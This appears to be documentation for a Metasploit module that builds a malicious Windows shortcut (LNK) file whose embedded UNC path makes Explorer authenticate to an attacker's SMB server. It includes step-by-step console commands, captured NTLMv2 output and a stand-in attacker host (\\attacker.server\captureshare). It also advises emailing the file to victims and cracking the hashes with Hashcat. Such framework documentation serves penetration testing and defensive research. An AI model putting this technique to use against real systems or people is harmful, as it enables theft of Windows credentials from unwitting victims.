This module generates a malicious Windows shortcut (LNK) file that embeds a special UNC path within the SpecialFolderDatablock of the Shell Link structure. When a victim browses to or interacts with the LNK file in Windows Explorer, it triggers an authentication attempt to the specified remote SMB server, enabling the capture of NTLM hashes.

This technique leverages a vulnerability in how Windows handles certain LNK file structures, resulting in automatic SMB connections without user interaction. The module can either point to a user-specified UNC path or start an integrated SMB capture server to harvest credentials.

Tested on Windows systems where Explorer processes LNK files.

## Vulnerable Application

Windows operating systems that process LNK files via Explorer, particularly when browsing directories containing the malicious shortcut. This can lead to NTLM credential leaks over SMB.

References:
- [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)
- [Exploit-DB 42382](https://www.exploit-db.com/exploits/42382)
- [Related Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb)

Disclosure Date: 2025-05-10 (reported to MSRC).

## Verification Steps

1. Start msfconsole.
2. Load the module: `use auxiliary/fileformat/specialfolderdatablock_lnk`.
3. Customize options as needed (e.g., set FILENAME, UNCPATH, or APPNAME).
4. Execute the module: `run`.
5. A malicious LNK file will be generated.
6. If not using a custom UNCPATH, the module starts an SMB capture server automatically.
7. Place the LNK file in a directory on the target system.
8. Browse to the directory in Windows Explorer to trigger the SMB connection.
9. Monitor the console for captured NTLM hashes.

## Options

**FILENAME**

Specifies the name of the generated LNK file.

Default: `msf.lnk`

Example:
```
set FILENAME malicious.lnk
```

**UNCPATH**

Defines the UNC path (e.g., `\\server\share`) that the LNK file will attempt to access. If not set, the module starts its own SMB server.

Example:
```
set UNCPATH \\192.168.1.100\share
```

**APPNAME**

Sets the display name of the application in the LNK file. If empty, a random name is generated.

Example:
```
set APPNAME FakeApp
```

**Advanced Options**

**SRVHOST**

The local host to listen on for the integrated SMB server (if UNCPATH is not set).

Default: `0.0.0.0`

Example:
```
set SRVHOST 192.168.1.25
```

**SRVPORT**

The local port for the integrated SMB server.

Default: `445`

Example:
```
set SRVPORT 445
```

## Scenarios

### Basic NTLM Hash Capture on Windows

Target: A Windows system with Explorer (e.g., Windows 10 or later).

Attacker: Use the module to generate the LNK and capture hashes locally.

```
msf > use auxiliary/fileformat/specialfolderdatablock_lnk
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set FILENAME malicious.lnk
FILENAME => malicious.lnk
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set SRVHOST 192.168.1.25
SRVHOST => 192.168.1.25
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set APPNAME FakeApp
APPNAME => FakeApp
msf auxiliary(fileformat/specialfolderdatablock_lnk) > run

[*] Starting SMB server on 192.168.1.25:445
[*] Generating malicious LNK file
[+] malicious.lnk stored at /root/.msf4/local/malicious.lnk
[*] Listening for hashes on 192.168.1.25:445
[*] Auxiliary module execution completed
```

Deliver the `malicious.lnk` file to the target (e.g., via email or shared drive). When the victim opens the containing folder in Explorer, an SMB connection is attempted:

```
[*] SMB Captured - 2025-09-18 21:03:00 +0530
NTLMv2 Response Captured from 192.168.1.50:49180 - 192.168.1.50
USER:targetuser DOMAIN:TARGETPC OS: Windows 10 LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:examplehashvalue
NT_CLIENT_CHALLENGE:examplechallenge
```

Crack the captured hash using tools like Hashcat to recover credentials.

### Using a Custom UNC Path

If you have an external SMB server set up (e.g., for remote capture):

```
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set UNCPATH \\attacker.server\captureshare
UNCPATH => \\attacker.server\captureshare
msf auxiliary(fileformat/specialfolderdatablock_lnk) > run

[*] Generating malicious LNK file pointing to \\attacker.server\captureshare
[+] malicious.lnk stored at /root/.msf4/local/malicious.lnk
[*] Auxiliary module execution completed
```

Monitor your external SMB server for incoming authentication attempts.